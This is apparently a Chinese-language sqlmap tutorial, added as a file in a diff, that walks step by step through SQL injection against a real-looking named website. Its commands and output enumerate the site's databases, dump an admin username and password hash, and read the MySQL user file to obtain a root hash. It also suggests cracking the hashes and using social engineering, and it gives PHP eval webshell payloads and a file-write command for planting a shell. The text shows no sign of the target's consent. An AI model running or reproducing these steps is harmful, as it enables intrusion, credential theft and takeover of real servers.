@@ -1,0 +1,136 @@
+
+--------------------------------------------------------------------------------------------------------------------------
+注解：
+1.在BT5 R2下 sqlmap安装路径为root@bt:/pentest/database/sqlmap#  也可以通过启动快捷方式启动sqlmap
+root@bt:/pentest/database/sqlmap# python sqlmap.py -u http://www.wepost.com.hk/article.php?id=276 -f -b --current-user --current-db -v 1         /*获取当前用户和当前数据库
+返回结果 :
+[02:42:20] [INFO] fetching current user
+current user:    'root@localhost'
+[02:42:21] [INFO] fetching current database
+current database:    'wepost'
+这一句话命令代表的意思是：python sqlmap.py -u http://www.wepost.com.hk/article.php?id=276 -f -b --current-user --current-db -v 1
+看结果可以也可以知道 当前用户为 root  当前数据库为 wepost
+------------------------
+2.root@bt:/pentest/database/sqlmap# python sqlmap.py -u http://www.wepost.com.hk/article.php?id=276  --dbs -v 2                                   /*获取所有数据库
+返回结果 :
+available databases [8]:
+[*] bb
+[*] cart
+[*] information_schema
+[*] mysql
+[*] taipotour
+[*] test
+[*] wepost
+[*] wepost2
+看结果可以也可以知道 当前存在8个数据库
+--------------------------
+3.root@bt:/pentest/database/sqlmap# python sqlmap.py -u http://www.wepost.com.hk/article.php?id=276  --tables -D wepost -v 2                     /*获取wepost数据库（也就是当前数据库）的所有表名
+
+返回结果 :
+Database: wepost
+[6 tables]
++-------------+
+| admin       |
+| article     |
+| contributor |
+| idea        |
+| image       |
+| issue       |
++-------------+
+看结果可以也可以知道   存在6个表
+--------------------
+4.root@bt:/pentest/database/sqlmap# python sqlmap.py -u http://www.wepost.com.hk/article.php?id=276  --columns -D wepost -T admin -v 2     /*获取wepost数据库里admin表的字段
+返回结果 :
+Database: wepost
+Table: admin
+[4 columns]
++----------+-------------+
+| Column   | Type        |
++----------+-------------+
+| id       | int(11)     |
+| password | varchar(32) |
+| type     | varchar(10) |
+| userid   | varchar(20) |
++----------+-------------+
+看结果可以也可以知道   存在4个字段
+----------------------------
+5.root@bt:/pentest/database/sqlmap# python sqlmap.py -u http://www.wepost.com.hk/article.php?id=276 --dump  -D "wepost" -T "admin"  -C "userid,password"  -s "sqlnmapdb.log" -v -v 2 
+/*获取wepost数据库里 admin表里 userid和password字段里面的内容 并将数据保存下来 /pentest/database/sqlmap/output/www.wepost.com.hk
+返回结果 :
+Database: wepost
+Table: admin
+[1 entry]
++----------------------------------+------------+
+| password                         | userid     |
++----------------------------------+------------+
+| 7d4d7589db8b28e04db0982dd0e92189 | wepost2010 |
++----------------------------------+------------+
+[03:08:51] [INFO] Table 'wepost.admin' dumped to CSV file '/pentest/database/sqlmap/output/www.wepost.com.hk/dump/wepost/admin.csv'
+[03:08:51] [INFO] Fetched data logged to text files under '/pentest/database/sqlmap/output/www.wepost.com.hk'
+得到帐号密码| 7d4d7589db8b28e04db0982dd0e92189 | wepost2010 |
+破MD5找后台去把
+mysql既然是root权限 当然可以试着写shell或者读文件
+（一般读都是读apache配置文件找网站路径 网站配置文件获取root密码尝试社工直接登录linux的ssh或者登录phpmyadmin登录执行sql语句写shell 或者读其他铭感信息）
+ 
+root权限写shell的3个条件：
+1、知道站点物理路径
+2、有足够大的权限（可以用select …. from mysql.user测试）
+3、magic_quotes_gpc()=OFF
+新版本的 php 已经将默认的值改为了 On 开启时
+
+当magic_quotes_gpc = On　时，它会将提交的变量中所有的 '(单引号)、"(双号号)、\(反斜线)、空白字符，都为在前面自动加上 \ 进行转义
+如何判断 :
+1.工具穿山甲 
+2.and '1'='1'
+正常返回就是off，出错就是on
+条件达到之后
+
+直接注入点后
+方法1：
+http://www.wepost.com.hk/article.php?id=276 select  ‘<?php eval($_POST[cmd])?>’   into outfile ‘物理路径’
+方法2：
+http://www.wepost.com.hk/article.php?id=276 and 1=2 union all select 一句话HEX值 into outfile '物理路径'
+当magic_quotes_gpc = On　时 尝试读文件 读到root密码之后找phpmyadmin写shell  读linux用户
+目标系统为2003的
+http://www.wepost.com.hk/article.php?id=276%20and%201=2%20union%20select 1,2,3,4,5,@@datadir,7,8,9--
+返回mysql路径 c:\wamp\bin\mysql\mysql5.1.36\data\mysql\user.MYD
+补充完整的路径读取root密码
+
+6.root权限读文件
+root@bt:/pentest/database/sqlmap# python sqlmap.py -u http://www.wepost.com.hk/article.php?id=276 --file-read "c:\wamp\bin\mysql\mysql5.1.36\data\mysql\user.MYD" -v 2
+返回结果：
+c:/wamp/bin/mysql/mysql5.1.36/data/mysql/user.MYD file saved to:    '/pentest/database/sqlmap/output/www.wepost.com.hk/files/c__wamp_bin_mysql_mysql5.1.36_data_mysql_user.MYD'
+[03:38:55] [INFO] Fetched data logged to text files under '/pentest/database/sqlmap/output/www.wepost.com.hk'
+保存到了/pentest/database/sqlmap/output/www.wepost.com.hk/files/c__wamp_bin_mysql_mysql5.1.36_data_mysql_user.MYD 这里了
+root@bt:~# cd /pentest/database/sqlmap/output/www.wepost.com.hk/files/
+root@bt:/pentest/database/sqlmap/output/www.wepost.com.hk/files# cat  c__wamp_bin_mysql_mysql5.1.36_data_mysql_user.MYD  
+ 
+用cat查看得到的内容：
+---------------------------------------------------------------------------------------
+/ localhostroot/ 127.0.0.1root
+                           %8DDA7DC67ED2CA2AD9V'h%
+                                                                         worldgazers*6BB4837EB74329105EE456 
+X localhosthonoh*CFD1B60A4C68631E4EA4B2ABA1CBD17E301B0454root@bt:/
+ 
+---------------------------------------------------------------------------------------
+ 
+
+用head查看到的内容：
+root@bt:/pentest/database/sqlmap/output/www.wepost.com.hk/files# head c__wamp_bin_mysql_mysql5.1.36_data_mysql_user.MYD
+/ localhostroot/ 127.0.0.1root
+                           %8DDA7DC67ED2CA2AD9V'h%
+                                                                         worldgazers*6BB4837EB74329105EE456 
+X localhosthonoh*CFD1B60A4C68631E4EA4B2ABA1CBD17E301B0454root@bt:/pentest/database/sqlmap/output/www.wepost.com.hk/files# 
+
+得到40位root密码  CFD1B60A4C68631E4EA4B2ABA1CBD17E301B0454 拿去解密 之后尝试社工 或者找phpmyadmin写shell
+ 
+---------------------------------------------------------------------------------
+6.file-write写入文件到web
+sqlmap -u http://www.123.com/test.php?cid=2 --file-write /localhost/mm.php --file-dest /var/www/html/xx.php -v 2
+ 
+ 
+ 
+ 
+
+ 
+?
